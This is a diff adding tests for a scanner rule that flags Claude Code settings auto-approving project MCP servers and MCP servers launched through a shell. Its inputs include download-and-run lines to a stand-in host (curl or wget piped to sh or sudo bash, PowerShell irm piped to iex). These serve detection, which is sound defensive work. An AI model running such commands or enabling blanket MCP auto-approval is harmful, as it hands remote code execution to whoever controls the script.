@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
+import { mkdtempSync, mkdirSync, readdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 import { randomBytes } from "node:crypto";
@@ -1443,6 +1443,133 @@ describe("SW-L04 MCP server config", () => {
         ".vscode/mcp.json",
       ).all,
     ).toEqual([]);
+  });
+});
+
+describe("SW-L05 MCP servers auto-approved or launched through a shell", () => {
+  const L05 = resolve(__dirname, "../fixtures/rules/sw-l05");
+  /**
+   * Copies a fixture folder into a throwaway project. `claude-settings*.json` become
+   * `.claude/settings*.json`, so the repo itself never commits a live Claude Code settings file.
+   */
+  const fixture = (name: string) => {
+    const dir = join(L05, name);
+    const files: Record<string, string> = {};
+    for (const f of readdirSync(dir, { recursive: true, withFileTypes: true })) {
+      if (!f.isFile()) continue;
+      const rel = join(f.parentPath ?? f.path, f.name).slice(dir.length + 1).split("\\").join("/");
+      files[rel.replace(/^claude-(settings(\.local)?\.json)$/, ".claude/$1")] = readFileSync(join(dir, rel), "utf8");
+    }
+    return files;
+  };
+  /** SW-L05 findings at any confidence, as "file:line severity/confidence". */
+  const run = (files: Record<string, string>, config: typeof DEFAULT_CONFIG = { ...DEFAULT_CONFIG, minConfidence: "low" }) => {
+    const p = project(files);
+    const r = scan(p.root, config, RULES);
+    p.done();
+    const findings = r.findings.filter((f) => f.ruleId === "SW-L05");
+    return { all: findings.map((f) => `${f.file}:${f.line} ${f.severity}/${f.confidence}`), findings };
+  };
+  const settings = (o: object) => ({ ".claude/settings.json": JSON.stringify(o, null, 2) });
+  const server = (s: object) => ({ "mcp.json": JSON.stringify({ mcpServers: { tools: s } }, null, 2) });
+  const lines = (files: Record<string, string>) => run(files).all.map((s) => s.replace(/ .*/, ""));
+
+  it("vulnerable fixture: auto-approval, a curl | sh launch and a shell wrapper, with file and line", () => {
+    const r = run(fixture("vulnerable"));
+    expect(r.all).toEqual([".claude/settings.json:5 medium/high", "mcp.json:9 low/high", "mcp.json:12 low/medium"]);
+    const [auto, pipe, wrapper] = r.findings;
+    expect(auto!.title).toBe("Claude Code is set to approve every MCP server in the repo's .mcp.json");
+    expect(auto!.why).toContain('.claude/settings.json sets "enableAllProjectMcpServers": true, so once you trust this folder');
+    expect(auto!.fix).toContain('"enableAllProjectMcpServers": true');
+    expect(auto!.fix).toContain("enabledMcpjsonServers");
+    expect(pipe!.title).toBe('MCP server "deploy-tools" downloads a script and pipes it to a shell every time it starts');
+    expect(pipe!.why).toContain("curl -fsSL https://example.invalid/mcp/install.sh | sh");
+    expect(wrapper!.title).toBe('MCP server "notes" is launched through a shell (sh -c)');
+    expect(wrapper!.why).toContain('`sh -c "cd tools/notes && node server.js"`');
+    for (const f of r.findings) {
+      expect(f.fixPrompt).toContain(
+        "Remove auto-approval of project MCP servers and replace shell-wrapper launch commands with a direct, version-pinned command",
+      );
+      expect(f.column).toBeGreaterThan(1);
+    }
+    expect(auto!.fixPrompt).toContain(".claude/settings.json");
+    expect(pipe!.fixPrompt).toContain('"deploy-tools"');
+  });
+  it("vulnerable fixture: the plain shell wrapper is medium confidence, so hidden by default", () => {
+    expect(run(fixture("vulnerable"), DEFAULT_CONFIG).all).toEqual([".claude/settings.json:5 medium/high", "mcp.json:9 low/high"]);
+  });
+  it("fixed fixture: the setting false or absent, and direct commands with args", () => {
+    expect(Object.keys(fixture("fixed")).sort()).toEqual([".claude/settings.json", ".claude/settings.local.json", "mcp.json"]);
+    expect(run(fixture("fixed")).all).toEqual([]);
+  });
+  it("decoy fixture: unpinned npx, node server.js, and the key only in a comment or string", () => {
+    expect(run(fixture("decoy")).all).toEqual([]);
+  });
+
+  it("vulnerable: settings.local.json, a package's own .claude folder, and JSON with comments", () => {
+    const local = run({ ".claude/settings.local.json": '{ "enableAllProjectMcpServers": true }' });
+    expect(local.all).toEqual([".claude/settings.local.json:1 medium/high"]);
+    expect(local.findings[0]!.why).toContain("if it is committed, the setting applies to everyone who clones the repo");
+    expect(lines({ "apps/web/.claude/settings.json": '{\n  "enableAllProjectMcpServers" : true\n}' })).toEqual(["apps/web/.claude/settings.json:2"]);
+    expect(
+      lines({ ".claude/settings.json": '{\n  // "enableAllProjectMcpServers": false\n  "model": "x", /* note */\n  "enableAllProjectMcpServers": true\n}' }),
+    ).toEqual([".claude/settings.json:4"]);
+  });
+  it("vulnerable: is reported even before the repo has an .mcp.json", () => {
+    expect(lines({ ...settings({ enableAllProjectMcpServers: true }), "package.json": "{}" })).toEqual([".claude/settings.json:2"]);
+  });
+  it("decoy: false, a string, a nested key, broken JSON, or another tool's settings", () => {
+    expect(lines(settings({ enableAllProjectMcpServers: false }))).toEqual([]);
+    expect(lines(settings({ enableAllProjectMcpServers: "true" }))).toEqual([]);
+    expect(lines(settings({ permissions: { enableAllProjectMcpServers: true } }))).toEqual([]);
+    expect(lines({ ".claude/settings.json": '{ "enableAllProjectMcpServers": true, }}' })).toEqual([]);
+    expect(lines({ ".vscode/settings.json": '{ "enableAllProjectMcpServers": true }' })).toEqual([]);
+    expect(lines({ "claude-settings.json": '{ "enableAllProjectMcpServers": true }' })).toEqual([]);
+  });
+
+  it("vulnerable: wget, bash -lc, a shell given by path, and a whole command line in command", () => {
+    expect(run(server({ command: "sh", args: ["-c", "wget -qO- https://example.invalid/i | bash"] })).all).toEqual(["mcp.json:7 low/high"]);
+    expect(run(server({ command: "/bin/bash", args: ["-lc", "cd srv && npm start"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "bash -c 'curl -sL https://example.invalid/i | sudo bash'" })).all).toEqual(["mcp.json:4 low/high"]);
+    expect(run(server({ command: "zsh", args: ["-c", "node s.js"] })).findings[0]!.title).toBe('MCP server "tools" is launched through a shell (zsh -c)');
+    const env = run(server({ command: "/usr/bin/env", args: ["-i", "HOME=/tmp", "bash", "-c", "node tools.js"] }));
+    expect(env.all).toEqual(["mcp.json:4 low/medium"]);
+    expect(env.findings[0]!.why).toContain('`bash -c "node tools.js"`');
+    expect(lines(server({ command: "env", args: ["NODE_ENV=production", "node", "server.js", "-c", "x"] }))).toEqual([]);
+  });
+  it("vulnerable: Windows shells", () => {
+    expect(run(server({ command: "cmd", args: ["/c", "cd srv && node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "cmd.exe", args: ["/C", "npx -y pkg@1.0.0 > log.txt"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "powershell.exe", args: ["-Command", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "pwsh", args: ["-enc", "ZQBjAGgAbwA="] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "PowerShell", args: ["-NoProfile", "-c", "irm https://example.invalid/i | iex"] })).all).toEqual([
+      "mcp.json:8 low/high",
+    ]);
+  });
+  it("decoy: shells running a script file, unpinned npx and uvx, docker, and look-alike names", () => {
+    expect(lines(server({ command: "bash", args: ["scripts/start-mcp.sh"] }))).toEqual([]);
+    expect(lines(server({ command: "npx", args: ["-y", "some-mcp-server"] }))).toEqual([]);
+    expect(lines(server({ command: "uvx", args: ["mcp-server-fetch"] }))).toEqual([]);
+    expect(lines(server({ command: "docker", args: ["run", "-i", "--rm", "ghcr.io/example/mcp:1.2.0"] }))).toEqual([]);
+    expect(lines(server({ command: "node", args: ["server.js", "-c", "config.json"] }))).toEqual([]);
+    expect(lines(server({ command: "shellcheck-mcp", args: ["-c"] }))).toEqual([]);
+    // The usual way to start an npx server on Windows.
+    expect(lines(server({ command: "cmd", args: ["/c", "npx", "-y", "@modelcontextprotocol/server-github"] }))).toEqual([]);
+    expect(lines(server({ url: "https://mcp.example.net/sse", headers: { Authorization: "Bearer ${env:T}" } }))).toEqual([]);
+  });
+  it("finds the shell wrapper in every MCP config SW-L04 reads", () => {
+    const s = { mcpServers: { tools: { command: "bash", args: ["-c", "node s.js"] } } };
+    for (const name of [".mcp.json", ".cursor/mcp.json", ".vscode/mcp.json", "claude_desktop_config.json"]) {
+      expect(lines({ [name]: JSON.stringify(s, null, 2) }), name).toEqual([`${name}:4`]);
+    }
+    expect(lines({ ".vscode/mcp.json": JSON.stringify({ servers: s.mcpServers }, null, 2) })).toEqual([".vscode/mcp.json:4"]);
+  });
+  it("honours seaworthy-ignore in settings with comments", () => {
+    const p = project({ ".claude/settings.json": '{\n  // seaworthy-ignore SW-L05 sandbox VM only\n  "enableAllProjectMcpServers": true\n}' });
+    const r = scan(p.root, DEFAULT_CONFIG, RULES);
+    p.done();
+    expect(r.findings.filter((f) => f.ruleId === "SW-L05")).toEqual([]);
+    expect(r.suppressed.map((f) => `${f.ruleId} ${f.file}:${f.line}`)).toEqual(["SW-L05 .claude/settings.json:3"]);
   });
 });
 
